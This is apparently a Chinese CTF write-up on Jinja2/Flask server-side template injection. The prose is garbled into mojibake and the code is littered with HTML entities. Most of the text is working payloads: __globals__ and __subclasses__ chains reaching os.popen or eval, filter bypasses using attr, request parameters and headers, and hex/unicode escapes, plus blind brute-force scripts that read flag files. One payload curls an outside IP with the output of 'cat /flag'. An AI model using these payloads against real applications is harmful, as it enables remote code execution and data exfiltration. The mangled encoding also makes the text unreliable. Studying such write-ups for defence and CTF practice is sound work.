è¯¥æ–¹æ³•ä¸ä½†æ‰§è¡Œå‘½ä»¤è¿˜è¿”å›æ‰§è¡Œåçš„ä¿¡æ¯å¯¹è±¡ï¼Œæ˜¯é€šè¿‡ä¸€ä¸ªç®¡é“æ–‡ä»¶å°†ç»“æœè¿”å›ã€‚ output = os.popen(â€˜cat /proc/cpuinfoâ€™) print output.read() äºæ˜¯æˆ‘ä»¬æ„é€ æœ€ç»ˆçš„payloadï¼š 1&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir()&#x27;).read()&#125;&#125; 1.2 configä»¥å¤–çš„æ€è·¯å…¶ä»–çš„ä¸€äº›æ€è·¯ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬çš„configè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡()å’Œâ€™â€™åˆ†åˆ«è·å–åˆ°tupleå’Œstrçš„åˆå§‹åŒ–~ 12&#x27;&#x27;.__class__.__name__ #å¾—åˆ°str()_.__class__.__name__ #tuple è¿™æ—¶å¼•å…¥baseå’Œmroçš„é­”æœ¯æ–¹æ³• 12bases : ç±»çš„åŸºç±»çš„å…ƒç»„ï¼Œé¡ºåºä¸ºå®ƒä»¬åœ¨åŸºç±»åˆ—è¡¨ä¸­å‡ºç°çš„é¡ºåºï¼ˆåŸºç±»å°±æ˜¯Objectç±»~ï¼‰mro :ç±»çš„çˆ¶ç±»ï¼Œä»çˆ¶ç±»ç½‘ä¸Šæ‰¾ï¼Œæœ€ç»ˆä¼šæ‰¾åˆ°åŸºç±»ï¼Œæ‰€ä»¥mro[-1]ç­‰ä»·äº__bases__ è¿™æ—¶å€™æˆ‘ä»¬å°±æƒ³åˆ°çš„ï¼Œæˆ‘ä»¬æ—¢ç„¶å¾—åˆ°äº†åŸºç±»ï¼Œæ˜¯ä¸æ˜¯å°±æƒ³è¦æ‰€æœ‰çš„å­ç±»äº†å‘¢ï¼Ÿæ¯•ç«Ÿå­ç±»çš„å†…å®¹æˆ‘ä»¬æ›´åŠ æ„Ÿå…´è¶£ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°osåº“å¯¹å§ã€‚è€Œpythonæ­£å¥½æ‹¥æœ‰è¿™ä¸ªé­”æœ¯æ–¹æ³• 1__subclasses__ #è·å–æ‰€æœ‰çš„å­ç±»æ–¹æ³• ä¹‹åæ…¢æ…¢å»å¯»æ‰¾å³å¯ï¼Œè¯¥æ–‡ç« ä¸­æœ‰ï¼Œåœ¨catch_warnningsæ¨¡å—ä¸‹å«æœ‰builtinsï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªå»æ‰¾evalï¼š 12&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;) &#125;&#125; è¡¥å……æ€è·¯ï¼š 1&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[&quot;catch_warnings&quot;].__init__.__globals__.__builtins__[&quot;eval&quot;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) &#125;&#125; 1.3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼šæ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è¦ä¹ˆå»æ‰¾builtinså‡½æ•°ä¸‹çš„evalï¼Œè¦ä¹ˆå»æ‰¾osã€‚ 1str&#x3D; %EF%B9%9B%EF%B9%9Bself.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read()%EF%B9%9C%EF%B9%9C 2.è°ˆè°ˆè¿‡æ»¤åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼šé‡è§å„ç§å„æ ·çš„è¿‡æ»¤ï¼Œæ¯”å¦‚æˆ‘ä»¬é‡è§å¯¹configçš„è¿‡æ»¤ï¼Œä»¥åŠosè¿‡æ»¤å•Šç­‰ç­‰ 2.1 è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¹Ÿä¸éœ€æ…Œï¼Œå¦‚æœåªæ˜¯å¯¹ä¸­æ‹¬å·ä¸­å¯èƒ½ç”¨åˆ°çš„å†…å®¹è¿›è¡Œè¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡æ‹¼æ¥ç»•è¿‡ï¼š æ¯”å¦‚æˆ‘ä»¬ä¹‹å‰çš„payloadä¿®æ”¹æˆï¼š 1?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125; 2.2 è¿‡æ»¤äº†ä¸­æ‹¬å·è¿™æ ·çš„è¯,å¯ä»¥ç”¨getitemæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç­‰ä»·äºä¸€ä¸ªè¿­ä»£å™¨çš„é€‰æ‹©ï¼Œå¼€å‘è€…çš„åŸæ„æ˜¯è®©äººä»¬å¯ä»¥ç”¨è¿™ä¸ªè¿­ä»£å¯¹è±¡,è¿™ç¯‡æ–‡ç« è®²çš„ä¸é”™ 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775 Pythonçš„é­”æ³•æ–¹æ³•__getitem__ å¯ä»¥è®©å¯¹è±¡å®ç°è¿­ä»£åŠŸèƒ½ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨for...in... æ¥è¿­ä»£è¯¥å¯¹è±¡äº†ï¼ŒåŒæ—¶ä¹Ÿå…è®¸æˆ‘ä»¬åˆ©ç”¨gettiemæ¥ç›´æ¥é€‰æ‹©å†…å®¹,æ‰€ä»¥æˆ‘ä»¬ä¹‹å‰çš„payloadï¼š 1&#123;&#123; config.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() &#125;&#125; åˆ©ç”¨requestèµ·æ­¥ 1&#123;&#123; request.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(192).__init__.__globals__.__builtins__.__getitem__(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125; 2.3 è¿‡æ»¤äº†.å·è¿™ä¸ªå¯ä»¥ä½¿ç”¨attræ¥è¿›è¡Œç»•è¿‡äº†ï¼Œç›´æ¥ç»™å‡ºç»•è¿‡æ–¹æ³•ï¼š æ‰€ä»¥ä¹‹å‰çš„payloadè¿›è¡Œå¯¹æ¯”ï¼š 12345[].__class__ = []|attr(__class__)&#123;&#123;[]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)() &#125;&#125;&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[190] &#125;&#125; 1&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[192]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__builtins__&#x27;)|attr(__getitem__)(&#x27;eval&#x27;) &#125;&#125; ä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨æˆ‘ä»ä¸Šå¾€ä¸‹ç»§ç»­å–å€¼çš„æ—¶å€™ï¼Œæ€ä¹ˆéƒ½æ²¡æ³•ç»§ç»­å‘ä¸‹å–å€¼äº†ã€‚ä½†æ˜¯çœ‹è§å¯ä»¥è½¬æ¢æ€è·¯ 2.5åˆ©ç”¨requestâ€‹ å› ä¸ºflaskæ­¤æ—¶èƒ½å…è®¸ç”¨æˆ·è‡ªå®šä¹‰è¾“å‡ºï¼Œåæœ‰å…«ä¹æ˜¯æœ‰requestçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å»åˆ©ç”¨è¿™ä¸ªä¹Ÿä¸æ˜¯ç›¸å½“ä¸é”™çš„ è¿™é‡Œç¿»é˜…åˆ°äº†ä¸€ä¸ªè€å¤–æ€è·¯ï¼Œä½†æ˜¯ä»–æ²¡ç»™å…¨ã€‚ 1http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;) &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init åˆ©ç”¨requestçš„æ€è·¯å»é‡æ–°æŠŠpayloadæ‹¼å‡ºæ¥ 1?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() 2.4å°†ä¸­æ‹¬å·å’Œ.å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹å½“ç„¶ä¸Šé¢çš„éš¾åº¦éƒ½æ˜¯ç›¸å½“ç®€å•çš„é¢˜ç›®æ‰ä¼šé‡è§äº†ï¼Œåœ¨å½“å‰ç¯å¢ƒä¸‹ï¼Œå¾€å¾€ä¼šè¿‡æ»¤çš„ç›¸å½“ä¸¥æ ¼ï¼Œæˆ‘ä»¬åº”è¯¥ä»flaskæœ¬èº«å‡ºç°çš„ç±»å¼€å§‹æ‰¾ï¼Œæ¯”å¦‚é¢˜ç›®å¯èƒ½éªŒè¯çš„æ—¶å€™ï¼Œä»…ä»…éªŒè¯æˆ‘ä»¬è¾“å…¥çš„idã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ­¤ï¼Œè®©flaskè¯»å–headerä¸­çš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥æ‰“ç ´é™åˆ¶ æˆ‘ä»¬å¯ä»¥å…ˆå†™ä¸€ä¸ªè„šæœ¬ï¼š 123456789101112http://localhost/?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä¹‹åä¸ºäº†ç»•è¿‡æ‹¬å·çš„é™åˆ¶ï¼Œé‡‡ç”¨è¿™ç§æ–¹æ³•ï¼š è¿™é‡Œç»™å‡ºä¸€ä¸ªpayloadï¼š 12345678910111213141516171819&#123;% for c in []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125; &#123;% if c|attr(request.headers.x4)==request.headers.x5 %&#125; &#123;%for d in ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125; &#123;%if d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif%&#125;&#123;% endfor %&#125; x13: x9: evalx8: __builtins__x7: __globals__x6: __init__x5: catch_warningsx4: __name__x3: __subclasses__x2: __base__x1: __class__ 2.6 è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·çš„æƒ…å†µåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±åªèƒ½å»å°è¯•æŸ¥æ‰¾å„ç±»çš„openå‡½æ•°äº†ï¼Œæ²¡æœ‰åŠæ³•æ‰§è¡Œå‘½ä»¤äº†ï¼Œäºæ˜¯æŸ¥æ‰¾åˆ°ï¼š 1self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read() ä¹‹åä¸ºäº†ç»•è¿‡å¼•å·çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å°è¯•ä½¿ç”¨request.args.x1çš„æ–¹å¼è¿›è¡Œç»•è¿‡ æ‹¼å‡‘å¾—ï¼š 2.7 è¯»å–æ–‡ä»¶1?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag è€Œå®é™…ä¸Šï¼Œæˆ‘å‘ç°ä¸­æ‹¬å·ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œæ›¿ä»£çš„ 1&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[request.args.x1](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125;&amp;x1=eval æ‹¼å‡‘å¾—å‡ºï¼š 1&#123;&#123; config.__class__.__init__.__globals__[request.args.x1].popen(request.args.x2).read() &#125;&#125;&amp;x1=os&amp;x2=dir 2.8è¿‡æ»¤äº†evalï¼Œpopenï¼Œä¸¤ä¸ªå·¦èŠ±æ‹¬å·è¿™é‡Œè®°å½•ä¸€ä¸‹è‡ªå·±å­¦ä¹ åˆ°çš„ä¸€é“é¢˜ç›®ï¼š ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›ï¼š123456789101112131415161718192021222324252627282930313233343536373839from flask import Flask,request,render_templatefrom jinja2 import Templateimport osapp = Flask(__name__)f = open(&#x27;/flag&#x27;,&#x27;r&#x27;)flag = f.read()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def home():__ name = request.args.get(&quot;name&quot;) or &quot;&quot; print(name) if name: return render_template(&#x27;index.html&#x27;,name=name) else: return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])def help(): help = &#x27;&#x27;&#x27; &#x27;&#x27;&#x27; return f.read()@app.errorhandler(404)def page_not_found(e): #No way to get flag! os.system(&#x27;rm -f /flag&#x27;) url = name = request.args.get(&quot;name&quot;) or &quot;&quot; r = request.path r = request.data.decode(&#x27;utf8&#x27;) if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: t = Template(&quot; Not found!&quot;) return render_template(t), 404 t = Template(r + &quot; Not found!&quot;) return render_template(t), 404if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8888) è¿™é“é¢˜æ¯”è¾ƒæ–°æœ‰æ„æ€çš„ç‚¹åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼š è¿‡æ»¤äº†è¿™ä¸ªåœ°æ–¹ï¼š 1if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: è¿‡æ»¤äº†{ {} },è¿™æ ·å­çš„æƒ…å†µä»¥å‰è‡ªå·±æ²¡æœ‰é‡è¿‡ï¼Œåæ¥çŸ¥é“å¯ä»¥è¿›è¡Œç›²æ³¨ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶çš„payloadå¦‚ä¸‹ï¼š 1&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125; å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä¼šè¾“å‡ºp0ï¼Œå¦åˆ™å°±ä¸ä¼šè¾“å‡ºã€‚ç¬¬äºŒç‚¹ï¼Œæˆ‘ä»¬è¯¥è¯»å–ä»€ä¹ˆæ–‡ä»¶å‘¢ï¼Ÿ è¿™é‡Œè¿ç”¨äº†os.system(â€œrm -f /flagâ€) é»˜è®¤çš„è¿›ç¨‹åˆ é™¤åä¼šå­˜æ”¾åœ¨æš‚æ—¶æ–‡ä»¶ä¸­ï¼Œè¿›ç¨‹ä¸ºï¼š 1/proc/self/fd/3 æ•…ç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š 12345678910111213141516171819202122import requestsimport stringurl = &#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;headers=&#123; &#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;def check(payload): r = requests.post(url, data=payload,headers=headers).text return &#x27;~p0~&#x27; in rpassword = &#x27;&#x27;sa=string.printable#print(s)for i in range(0,100): for c in sa: payload=&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27; + str(i) + &#x27;:&#x27; + str( i + 1) + &#x27;] == &quot;&#x27; + c + &#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) if check(payload): password += c break print(password) è„šæœ¬ï¼š 123456789101112131415161718import requests,stringurl = &quot;http://localhost:8080&quot;list = string.ascii_letters + string.digits+ &quot;-/_&#123;&#125;&quot;flag = &quot;&quot;for i in range(999): for j in list: payload = &#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()[&#x27;+str(i)+&quot;:&quot;+str(i+1)+&#x27;] == &quot;&#x27;+j+&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) data =&#123;&quot;id&quot;:payload&#125; res = requests.get(url,params=data).text # print(res) if &quot;~p0~&quot; in res: i+=1 flag+=j print(&quot;flag:&quot; + flag) break è¿˜æœ‰ä¸€ä¸ªï¼š 12&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4)(233)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8)(request.values.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() 2.8è¿‡æ»¤äº†ç©ºæ ¼ï¼ŒrequestspayloadåŸºæœ¬æ²¡æœ‰å˜åŠ¨ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹è¿˜è¢«æ¶å¿ƒäº†ä¸€ä¸‹requestï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥è¿™æ ·ç”¨ï¼š åŸæœ¬æ­£å¸¸çš„payload 1?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1&#x3D;flag æ”¹é€ åï¼š 1?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;cat\\x20&#x2F;flag&quot;).read() &#125;&#125; 2.9åˆ©ç”¨{ %ç›´æ¥è¯»å–æ–‡ä»¶ä»¥å‰ä¸€ç›´ä»¥ä¸º æ˜¯ä¸èƒ½ç›´æ¥è¯»å–æ–‡ä»¶çš„ï¼Œåé¢æ‰å‘ç°ï¼š 1&#123;%print(config)%&#125; è¿™æ ·å°±å¯ä»¥æ­£å¸¸çš„è¾“å‡ºè¯­å¥ å°†ä¸‹é¢è¿™äº›ï¼š 1&#123;%print(a|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;))%&#125; ç¬¬äºŒç§ï¼š 1&#123;%print(config|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;))%&#125; å¦‚æœæ¯”èµ›ç¯å¢ƒä¸­åŒ…å«å›æ˜¾ï¼Œå…¶å®ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¹ˆä¸€ä¸ªæ€è·¯,æŸ¥æ‰¾catch_warningsï¼š 1?name=&#123;%print(([]|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)())[169].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) )%&#125; hgameé‡è§çš„ï¼š 1&#123;%print(config|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[1:]&quot;))%&#125; æŒ¨ä¸ªåå…­è¿›åˆ¶ é™„ä¸Šä¸€ä¸ªè½¬åå…­è¿›åˆ¶çš„å°è„šæœ¬ï¼š 12345678910111213141516import binasciia = &quot;__globals__&quot;# print(h)for i in a : i = bytes(i,encoding=&quot;utf-8&quot;) i = binascii.b2a_hex(i) i = i.decode(&quot;ascii&quot;) i = str(i) i = i.replace(i,&quot;\\\\x&quot;+i) # i = i.replace(i,&quot;\\\\x&quot;+i) print(i,end=&quot;&quot;)# print(h) åœ¨åä¸ºæ¯”èµ›ä¸­ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344 #! /usr/bin/env python#encoding=utf-8from flask import Flask,render_template,redirectfrom flask import requestimport urllibimport sysimport osfrom jinja2 import Templateapp = Flask(__name__)def safe_msg(msg): blacklist = [&#x27;~&#x27;,&#x27;set&#x27;,&#x27;or&#x27;,&#x27;args&#x27;,&#x27;_&#x27;,&#x27;[&#x27;,&#x27;request&#x27;,&#x27;lipsum&#x27;,&#x27;=&#x27;,&#x27;chr&#x27;,&#x27;json&#x27;,&#x27;g&#x27;,&#x27;.&#x27;,&quot;&#x27;&quot;,&#x27;&#123;&#123;&#x27;,&#x27;u&#x27;,&#x27;get&#x27;,&#x27; &#x27;,&#x27;,&#x27;,&#x27;*&#x27;,&#x27;^&#x27;,&#x27;&amp;&#x27;,&#x27;$&#x27;,&#x27;#&#x27;,&#x27;@&#x27;,&#x27;!&#x27;] for i in blacklist: if i in msg: return False return True@app.route(&quot;/&quot;, methods=[&#x27;GET&#x27;])def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/over&quot;, methods=[&#x27;GET&#x27;])def over(): return render_template(&#x27;over.html&#x27;)@app.route(&quot;/success&quot;, methods=[&#x27;GET&#x27;])def success(): msg = request.args.get(&quot;msg&quot;) if(msg == None): msg = &#x27;anonymous&#x27; if safe_msg(msg): t = Template(&quot;Good Job! &quot; + msg + &quot; . But sorry, there isn&#x27;t flag&quot;) else: t = Template(&quot;You look dangerous.....&quot;) return t.render(request=request)if __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;, port=8000) . But sorry, there isn&#x27;t flag å¯ä»¥ç”¨åå…­è¿›åˆ¶ç»•è¿‡ 1&#123;%print(a|attr(&quot;\\x5f\\x5finit\\x5f\\x5f&quot;)|attr(&quot;\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f&quot;)|attr(&quot;\\x67\\x65\\x74&quot;)(&quot;\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f&quot;)|attr(&quot;\\x67\\x65\\x74&quot;)(&quot;\\x65\\x76\\x61\\x6c&quot;)(&quot;\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x22\\x6f\\x73\\x22\\x29\\x2e\\x70\\x6f\\x70\\x65\\x6e\\x28\\x22\\x63\\x61\\x74\\x20\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x22\\x29\\x2e\\x72\\x65\\x61\\x64\\x28\\x29&quot;))%&#125; é™¤äº†åå…­è¿›åˆ¶ï¼Œè¿˜æœ‰unicodeå¯ä»¥è¿›è¡Œç»•è¿‡ï¼š 1&#123;%print(a|attr(&quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&quot;)|attr(&quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u0067\\u0065\\u0074&quot;)(&quot;\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f&quot;)|attr(&quot;\\u0067\\u0065\\u0074&quot;)(&quot;\\u0065\\u0076\\u0061\\u006c&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;))%&#125; 2.10 æ ¼å¼åŒ–å­—ç¬¦ä¸²æ–°æ€è·¯123456789101112131415161718192021222324import redef product(poc): payload = &#x27;&#x27; for chr in poc: model = &quot;&#x27;&#123;0:c&#125;&#x27;[&#x27;format&#x27;](%d)&quot; % ord(chr) payload += model + &#x27;+&#x27; return payload[:-1]a = product(&#x27;__builtins__&#x27;).replace(&#x27;+&#x27;, &quot;%2b&quot;)print(a)# &#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[65].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]&#125;&#125;def decode(payload): res = re.findall(&quot;\\(\\d+\\)&quot;, payload) for i in res: print(chr(int(i[1:-1])), end=&quot;&quot;)decode(a) æ–‡ç« å‡ºå¤„ 2.11 è¿‡æ»¤äº†flagåå¼¹shellå‡ºå»ï¼š 1()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(233)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)|attr(&quot;__getitem__&quot;)(&quot;eval&quot;)(&quot;getattr(__import__(&#39;os&#39;),&#39;system&#39;)(&#39;curl http:&#x2F;&#x2F;123.57.240.205:1234&#x2F;?a&#x3D;&#96;cat &#x2F;flag&#96;&#39;)&quot;) 123456789101112&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a =lipsum|lower|list|random%&#125;&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(get=a,item=b)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(bui=a,ltins=b)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set ch=dict(c=a,hr=b)|join %&#125;&#123;% set chr= (x|attr(geti))(ch) %&#125;&#123;% set a=(lipsum|attr(glo)).get(built) %&#125; 1234567891011121314151617181920212223242526272829&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a =lipsum|lower|list|random%&#125;&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(get=a,item=b)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(bui=a,ltins=b)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set ev=dict(ev=a,al=b)|join %&#125;&#123;% set eev= (x|attr(geti))(ev) %&#125;&#123;%set oo=(dict(o=a,s=b)|join)%&#125;&#123;% set or=dict(or=a,d=b)|join %&#125;&#123;% set ord= (x|attr(geti))(or) %&#125;&#123;% set ch=dict(c=a,hr=b)|join %&#125;&#123;% set cch= (x|attr(geti))(ch) %&#125;&#123;% set f=dict(F=a)|join%&#125;&#123;% set m=dict(m=a)|join%&#125;&#123;%set sin=cch(ord(m)-ord(f))%&#125;&#123;% set R=dict(R=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set kuoa=cch(ord(z)-ord(R))%&#125;&#123;% set Q=dict(Q=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set kuob=cch(ord(z)-ord(Q))%&#125;&#123;% set L=dict(L=a)|join%&#125;&#123;% set z=dict(z=a)|join%&#125;&#123;%set dos=cch(ord(z)-ord(L))%&#125;&#123;% set arg=(a,a,dict(imp=a,ort=b)|join,a,a,kuoa,sin,oo,sin,kuob,dos,dict(sys=a,tem=b)|join,kuoa,sin,dict(who=a,ami=b)|join,sin,kuob)|join()%&#125;&#123;&#123;arg&#125;&#125;&#123;&#123; eev(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125; 